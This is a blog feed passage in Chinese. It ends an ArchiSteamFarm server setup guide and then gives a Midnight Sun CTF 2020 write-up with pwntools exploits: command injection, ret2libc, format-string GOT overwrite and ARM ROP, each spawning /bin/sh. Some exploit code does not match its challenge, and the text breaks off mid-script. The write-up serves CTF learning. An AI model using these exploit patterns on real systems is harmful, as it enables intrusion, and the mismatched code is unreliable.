class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -S asfcd /home/asf./ArchiSteamFarm</span><br></pre></td></tr></table></figure><p>按 <code>Ctrl+A+D</code> 搁置窗口，程序已经在后台运行了，可以放心退出终端了。</p><h4 id="Systemd（推荐）"><a href="#Systemd（推荐）" class="headerlink" title="Systemd（推荐）"></a>Systemd（推荐）</h4><p>安装 systemd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install systemd</span><br></pre></td></tr></table></figure><p>创建 service 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;asf.service</span><br></pre></td></tr></table></figure><p>输入以下内容并保存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;Archi Steam Farm</span><br><span class="line">After&#x3D;network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;simple</span><br><span class="line">User&#x3D;root</span><br><span class="line">EnvironmentFile&#x3D;&#x2F;etc&#x2F;environment</span><br><span class="line">Environment&#x3D;&quot;&quot;</span><br><span class="line">ExecStart&#x3D;&#x2F;root&#x2F;asf&#x2F;ArchiSteamFarm</span><br><span class="line">Restart&#x3D;always</span><br><span class="line">RestartSec&#x3D;15s</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure><p>现在可以运行了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service asf start  # 开始运行挂卡</span><br><span class="line">service asf stop   # 停止运行</span><br><span class="line">service asf status # 查看服务状态</span><br></pre></td></tr></table></figure><h3 id="steam-两步验证"><a href="#steam-两步验证" class="headerlink" title="steam 两步验证"></a>steam 两步验证</h3><p>不可能在挂卡平台每次都手动输入密钥，这也太蠢了。那么我们就需要将令牌导入到 ASF 中，以实现自动登录。各个平台操作不同，详情请见<a href="https://github.com/JustArchi/ArchiSteamFarm/wiki/Two-factor-authentication">官方 WIKI</a>。</p><p>安卓设备的方法如下：</p><h4 id="手机-root"><a href="#手机-root" class="headerlink" title="手机 root"></a>手机 root</h4><p>首先，你需要有系统的 root 权限，这个不多说，每个设备都有所不同。</p><h4 id="提取令牌文件"><a href="#提取令牌文件" class="headerlink" title="提取令牌文件"></a>提取令牌文件</h4><p>安装一个能够访问系统根目录的文件管理器，如 <a href="https://play.google.com/store/apps/details?id=com.estrongs.android.pop">ES 文件浏览器</a>。</p><p>将文件 <code>/data/data/com.valvesoftware.android.steam.community/files/Steamguard-XXX</code> 复制出来，<code>XXX</code> 是你的 SteamID。重命名为 <code>BotName.maFile</code> 并放置到 <code>/home/asf/config</code> 目录下，程序会自动检测并读取。如我的 bot 名字为 test，则重命名为 <code>test.maFile</code>。</p><h4 id="提取设备-ID"><a href="#提取设备-ID" class="headerlink" title="提取设备 ID"></a>提取设备 ID</h4><p>将文件 <code>/data/data/com.valvesoftware.android.steam.community/shared_prefs/steam.uuid.xml</code> 打开，找到如 <code>android:XXXXXXXXXXXXXXXX</code> 字样，这就是你的设备 ID，注意保存。</p><h4 id="输入设备-ID"><a href="#输入设备-ID" class="headerlink" title="输入设备 ID"></a>输入设备 ID</h4><p>导入好令牌文件以后，首次启动，将会看到如下字样。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] INFO: ImportAuthenticator() &lt;1&gt; Converting .maFile into ASF format...</span><br><span class="line">&lt;1&gt; Please enter your Device ID (including &quot;android:&quot;):</span><br></pre></td></tr></table></figure><p>这时输入你的设备 ID，连 <code>android:</code> 字样一起输入，回车。看到如下字样，表示你已经完成，以后启动就不再需要输入了，会自动登录。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] INFO: ImportAuthenticator() &lt;1&gt; Successfully finished importing mobile authenticator!</span><br></pre></td></tr></table></figure><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>注意：为了你的 steam 账号安全，切勿暴露你的令牌文件和设备 ID。拥有这些内容，将能任意变更你的账户。</p><h3 id="为-Asf-ui-绑定域名"><a href="#为-Asf-ui-绑定域名" class="headerlink" title="为 Asf-ui 绑定域名"></a>为 Asf-ui 绑定域名</h3><p>这里只演示用宝塔面板操作，请提前将域名解析到服务器。</p><p>宝塔面板–&gt;网站–&gt;添加站点</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-04-14-8YMBizLmL1dAE5BV.png"></p><p>站点属性请看图：（也就是默认配置）</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-04-14-67IuEgi15dyREnjd.png"></p><p>点击站点名打开设置，选择 SSL 的Let’s Encrypt 申请证书</p><p><img src="C:\Users\SkYe\AppData\Roaming\Typora\typora-user-images\image-20200414220901751.png" alt="https://image-20200414220901751"></p><p>点击站点名打开设置，选择反向代理，配置如图</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-04-14-Evx1FGvnGAnaqMax.png"></p><p>现在就可以访问域名打开 WEB 界面。</p><h3 id="用-Telegram-远程控制-ASF-挂卡"><a href="#用-Telegram-远程控制-ASF-挂卡" class="headerlink" title="用 Telegram 远程控制 ASF 挂卡"></a>用 Telegram 远程控制 ASF 挂卡</h3><p>提供给有需求的人，要求主机上 python 版本至少为 3.6。</p><h4 id="向-Telegram-申请-bot-token"><a href="#向-Telegram-申请-bot-token" class="headerlink" title="向 Telegram 申请 bot token"></a>向 Telegram 申请 bot token</h4><p>在 Telegram 里，搜索 <code>@BotFather</code> 机器人并启用。</p><p>发送以下命令：</p><ol><li>创建机器人：<code>/newbot</code></li><li>设定 bot 名称：<code>ASF</code>(任取，可重复，这里只是个例子)</li><li>设定 bot 用户名：<code>test_asf_bot</code>(任取，不可重复，这里只是个例子)</li></ol><p><code>@BotFather</code> 会发给你一串 token，形如 <code>123456789:XXXXXX-XXXXXXXXXX</code>，注意保留。</p><h4 id="申请-Chat-ID"><a href="#申请-Chat-ID" class="headerlink" title="申请 Chat ID"></a>申请 Chat ID</h4><p>在 Telegram 里，搜索 <code>@getidsbot</code> 机器人并启用。</p><p>转发一条你自己的消息给 bot，会返回给你一串信息，里面包含你的 Chat ID 。</p><h4 id="安装-telegram-bot-asf"><a href="#安装-telegram-bot-asf" class="headerlink" title="安装 telegram_bot_asf"></a>安装 telegram_bot_asf</h4><p>请确保 python 版本正确</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/deluxghost/telegram-asf.git</span><br><span class="line">cd telegram-asf</span><br><span class="line">sudo pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure><p>编辑 <code>simple.config</code>，修改如下内容。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[telegram]</span><br><span class="line">bot_token = 你的机器人token</span><br><span class="line">admin_id = 你的chatid</span><br><span class="line">;proxy = socks5://127.0.0.1:1234</span><br><span class="line"></span><br><span class="line">[ipc]</span><br><span class="line">address = http://127.0.0.1:1242/</span><br><span class="line">password = 你设置的IPCPassword</span><br></pre></td></tr></table></figure><h4 id="后台启动-bot"><a href="#后台启动-bot" class="headerlink" title="后台启动 bot"></a>后台启动 bot</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -S asf-bot python3 simple.py simple.conf </span><br></pre></td></tr></table></figure><h4 id="在-Telegram-中使用这个-bot"><a href="#在-Telegram-中使用这个-bot" class="headerlink" title="在 Telegram 中使用这个 bot"></a>在 Telegram 中使用这个 bot</h4><p>搜索刚刚你设定的 bot 用户名，并启用，你已经可以发送命令远程控制 ASF 了。这个机器人只有你能使用。</p><h4 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h4><p>帮助命令：<code>help</code></p><p>开始命令：<code>start</code></p><p>暂停命令：<code>pause</code></p><p>继续命令：<code>resume</code></p><p>查看挂卡状态命令：<code>status</code></p><p>查看 asf 状态命令：<code>stats</code></p><p>查看版本命令：<code>version</code></p><p>激活 steam 密钥命令：<code>redeem </code></p><p>更多命令，请参<a href="https://github.com/JustArchi/ArchiSteamFarm/wiki/Commands">官方 WIKI</a>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> steam </tag>
            
            <tag> asf </tag>
            
            <tag> Steam云挂卡 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>midnight-sun-ctf-2020-quals-writeup</title>
      <link href="archives/4a91183a/"/>
      <url>archives/4a91183a/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次做国外 CTF 与国内有差异的，我感觉最明显的是题目会多个方向混合出题，比如说 web 与 pwn 结合出题。从部分题目和结合前几天看的 king of hill 直播，感觉国外 CTF 对 linux 知识也要有一定要求，不能仅仅只会做题的亚子。</p><h1 id="admpanel"><a href="#admpanel" class="headerlink" title="admpanel"></a>admpanel</h1><p><strong>考点：代码能力、linux基操</strong></p><p>程序为一个面板，自然有登录功能，帐号密码通过 IDA 看代码得出。登录成功后可以执行命令，但是程序给出提示只能执行 id 。但是使用的判断函数是 strncmp ，只要是子串都可以通过，换句话就是只有含有 id 都能执行。</p><p>完整 exp ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">p = remote(&amp;quot;admpanel-<span class="number">01.</span>play.midnightsunctf.se&amp;quot;,<span class="number">31337</span>)</span><br><span class="line"><span class="comment">#p = process(&amp;quot;./admpanel&amp;quot;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(&amp;quot;[<span class="number">3</span>] - Exit&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;<span class="number">1</span>&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;quot;username:&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;adminskye&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;quot;password:&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;passwordskye&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;quot;&amp;gt;&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;cat flag&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;quot;[<span class="number">3</span>] - Exit&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;<span class="number">2</span>&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;quot;execute&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;<span class="built_in">id</span>&amp;amp;&amp;amp;/<span class="built_in">bin</span>/sh&amp;quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn 1"></a>pwn 1</h1><p><strong>考点：栈溢出、ret2libc</strong></p><p>程序无预留后门，给了 libc 文件，因此需要 ret2libc 。栈溢出漏洞函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  printf_pic();</span><br><span class="line">  <span class="built_in">printf</span>(&amp;quot;buffer: &amp;quot;, <span class="number">0LL</span>);</span><br><span class="line">  gets(&amp;amp;v4);<span class="comment">//栈溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次需要泄露 libc_base 地址，然后 rop 回到 main 函数。第二次调用 system(‘/bin/sh’) 。</p><p>emmm这道题我用官方给的 libc 本地打不通，用本地系统 libc 就打成功了。然后死活连不上远程服务器，就没有拿 flag 。</p><p>** 完整 exp ：**</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#sh = remote(&amp;#039;111.198.29.45&amp;#039;,53033)</span></span><br><span class="line">sh=process(&amp;<span class="comment">#039;./level3&amp;#039;)</span></span><br><span class="line"> </span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">elf=ELF(&amp;<span class="comment">#039;./level3&amp;#039;)</span></span><br><span class="line">libc=ELF(&amp;<span class="comment">#039;./libc_32.so.6&amp;#039;)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#get func address</span></span><br><span class="line">write_plt = elf.plt[&amp;<span class="comment">#039;write&amp;#039;]</span></span><br><span class="line">write_got = elf.got[&amp;<span class="comment">#039;write&amp;#039;]</span></span><br><span class="line">main_addr = elf.symbols[&amp;<span class="comment">#039;main&amp;#039;]</span></span><br><span class="line"> </span><br><span class="line">payload = &amp;<span class="comment">#039;a&amp;#039;*0x8c + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)</span></span><br><span class="line"> </span><br><span class="line">sh.sendlineafter(&amp;quot;Input:\n&amp;quot;,payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#leak write&amp;#039;s addr in got</span></span><br><span class="line">write_got_addr = u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span> &amp;<span class="comment">#039;write_got address is&amp;#039;,hex(write_got_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc&amp;#039;s addr</span></span><br><span class="line">libc_addr = write_got_addr - libc.symbols[&amp;<span class="comment">#039;write&amp;#039;]</span></span><br><span class="line"><span class="built_in">print</span> &amp;<span class="comment">#039;libc address is&amp;#039;,hex(libc_addr)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#get system&amp;#039;s addr</span></span><br><span class="line">sys_addr = libc_addr + libc.symbols[&amp;<span class="comment">#039;system&amp;#039;]</span></span><br><span class="line"><span class="built_in">print</span> &amp;<span class="comment">#039;system address is&amp;#039;,hex(sys_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get bin/sh &amp;#039;s addr    strings -a -t x libc_32.so.6 | grep &amp;quot;/bin/sh&amp;quot;</span></span><br><span class="line"><span class="comment">#libc.search(&amp;quot;/bin/sh&amp;quot;).next()</span></span><br><span class="line">bin_sh_addr = libc_addr + <span class="number">0x15902b</span></span><br><span class="line"><span class="built_in">print</span> &amp;<span class="comment">#039;/bin/sh address is&amp;#039;,hex(bin_sh_addr)</span></span><br><span class="line"><span class="comment">#get second payload</span></span><br><span class="line">payload0 = &amp;<span class="comment">#039;a&amp;#039;*0x88 + &amp;#039;a&amp;#039;*0x4 + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)</span></span><br><span class="line"> </span><br><span class="line">sh.sendline(payload0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn 2"></a>pwn 2</h1><p><strong>考点：格式化字符串、覆写 exit_got rop 、格式化字符串泄露函数地址</strong></p><p>格式化字符串输入长度限制为 64 ，程序有 cannary 保护，且字符串输入长度不足够覆盖 eip ，因此需要另为的方法完成 rop 。办法就是覆写 exit 函数的 got 表地址为 main 地址。漏洞函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl __noreturn main(<span class="built_in">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s[<span class="number">4</span>]; // [esp+0h] [ebp-4Ch]</span><br><span class="line">  char v2; // [esp+4h] [ebp-48h]</span><br><span class="line">  unsigned <span class="built_in">int</span> v3; // [esp+40h] [ebp-Ch]</span><br><span class="line">  <span class="built_in">int</span> *v4; // [esp+44h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = &amp;amp;a1;</span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  *(_DWORD *)s = <span class="number">0</span>;</span><br><span class="line">  memset(&amp;amp;v2, <span class="number">0</span>, 0x3Cu);</span><br><span class="line">  setvbuf(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  sub_80485B6();</span><br><span class="line">  printf(&amp;quot;<span class="built_in">input</span>: &amp;quot;);</span><br><span class="line">  fgets(s, <span class="number">0x40</span>, stdin);</span><br><span class="line">  printf(s);//格式化字符串漏洞</span><br><span class="line">  exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这一步就和 pwn1 基本相识了，一次泄露 libc 基地址，一次完成覆写调用 system(‘/bin/sh’) 。也就是用格式化字符串泄露函数地址，用格式化字符串覆写函数 got 表地址。</p><p>完整 exp ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;info&amp;#039;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&amp;quot;pwn2-01.play.midnightsunctf.se&amp;quot;,10002)</span></span><br><span class="line">p = process(&amp;quot;./pwn2&amp;quot;)</span><br><span class="line">elf = ELF(&amp;quot;./pwn2&amp;quot;)</span><br><span class="line">libc = ELF(&amp;quot;./libc.so<span class="number">.6</span>&amp;quot;)</span><br><span class="line"></span><br><span class="line">exit_got = <span class="number">0x0804b020</span></span><br><span class="line">printf_got = <span class="number">0x804b00c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop</span></span><br><span class="line">payload = p32(exit_got)  </span><br><span class="line">payload += &amp;<span class="comment">#039;%34289c%7$hn&amp;#039;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;input&amp;#039;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;input&amp;#039;)</span></span><br><span class="line">p.sendline(&amp;quot;%<span class="number">30</span>$x&amp;quot;.ljust((<span class="number">63</span>-<span class="built_in">len</span>(&amp;quot;%<span class="number">30</span>$x&amp;quot;)),&amp;<span class="comment">#039;A&amp;#039;))</span></span><br><span class="line">data = p.recvuntil(&amp;quot;A&amp;quot;)</span><br><span class="line">printf_leak = <span class="built_in">int</span>(&amp;quot;0x&amp;quot;+data[-<span class="number">9</span>:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_base = printf_leak - libc.symbols[&amp;#039;printf&amp;#039;]</span></span><br><span class="line">libc_base = <span class="number">0x0804B010</span> - libc.symbols[&amp;<span class="comment">#039;printf&amp;#039;]</span></span><br><span class="line">log.info(&amp;quot;libc_base: &amp;quot;+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[&amp;<span class="comment">#039;system&amp;#039;]</span></span><br><span class="line">log.success(&amp;quot;system_addr:&amp;quot;+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">payload = pwnlib.fmtstr.fmtstr_payload(<span class="number">7</span>, &#123;printf_got:system_addr&#125;, numbwritten=<span class="number">0</span>, write_size=&amp;<span class="comment">#039;byte&amp;#039;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(&amp;quot;<span class="built_in">input</span>:&amp;quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn-3"><a href="#pwn-3" class="headerlink" title="pwn 3"></a>pwn 3</h1><p><strong>考点：栈溢出</strong></p><p>32 位只打开 NX 保护程序。IDA 打开函数名劝退。耐心分析后，找到 main 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_102FC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+0h] [bp+0h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+4h] [bp+4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  sub_1FDB0(&amp;amp;v3, <span class="number">0</span>, <span class="number">124</span>);</span><br><span class="line">  sub_155C0(off_6F4BC, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  sub_155C0(off_6F4B8, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v0 = sub_2120C(<span class="number">60</span>);</span><br><span class="line">  sub_102E4(v0);<span class="comment">//读取banner.txt入口函数</span></span><br><span class="line">  sub_14D00(&amp;quot;buffer: &amp;quot;);<span class="comment">//printf</span></span><br><span class="line">  sub_152A4(&amp;amp;v2, <span class="number">512</span>, off_6F4BC);<span class="comment">//read；栈溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还要重点关注的是 sub_102E4 ，判断是通过 system 读取文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_102E4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> my_system((<span class="keyword">int</span>)&amp;quot;cat ./banner.txt&amp;quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为 IDA 中找不到 system plt 地址，所以就看 sub_102E4  的汇编，找到传参的寄存器和方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sub_102E4                               ; CODE XREF: sub_102FC+<span class="number">40</span>↓p</span><br><span class="line">.text:<span class="number">000102E4</span>                 PUSH            &#123;R7,LR&#125;</span><br><span class="line">.text:<span class="number">000102E6</span>                 ADD             R7, SP, #<span class="number">0</span></span><br><span class="line">.text:<span class="number">000102E8</span>                 LDR             R3, =(aCatBannerTxt - <span class="number">0x102EE</span>)</span><br><span class="line">.text:<span class="number">000102</span>EA                 ADD             R3, PC  ; &amp;quot;cat ./banner.txt&amp;quot;</span><br><span class="line">.text:<span class="number">000102</span>EC                 MOV             R0, R3</span><br><span class="line">.text:<span class="number">000102</span>EE                 BL              my_system</span><br><span class="line">.text:<span class="number">000102F</span>2                 NOP</span><br><span class="line">.text:<span class="number">000102F</span>4                 POP             &#123;R7,PC&#125;</span><br></pre></td></tr></table></figure><p>找到之后就是用 ROPgadget 找可以用的寄存器传 /bin/sh 给 system 就行。 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">/bin/sh</span></span><br><span class="line">ROPgadget --binary pwn3 --string &amp;#039;/bin/sh&amp;#039;</span><br><span class="line">0x00049018 : /bin/sh</span><br><span class="line"><span class="meta">#</span><span class="bash">gadget</span></span><br><span class="line">ROPgadget --binary pwn3 --only &amp;#039;pop&amp;#039;</span><br></pre></td></tr></table></figure><p>完整 exp ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">p = process(&amp;quot;./pwn3&amp;quot;)</span><br><span class="line"><span class="comment">#p = remote(&amp;#039;pwn3-01.play.midnightsunctf.se&amp;#039;, 10003)</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x00049018</span></span><br><span class="line">system = <span class="number">0x14b5d</span></span><br><span class="line">pop_r0 = <span class="number">0x0001fb5c</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span 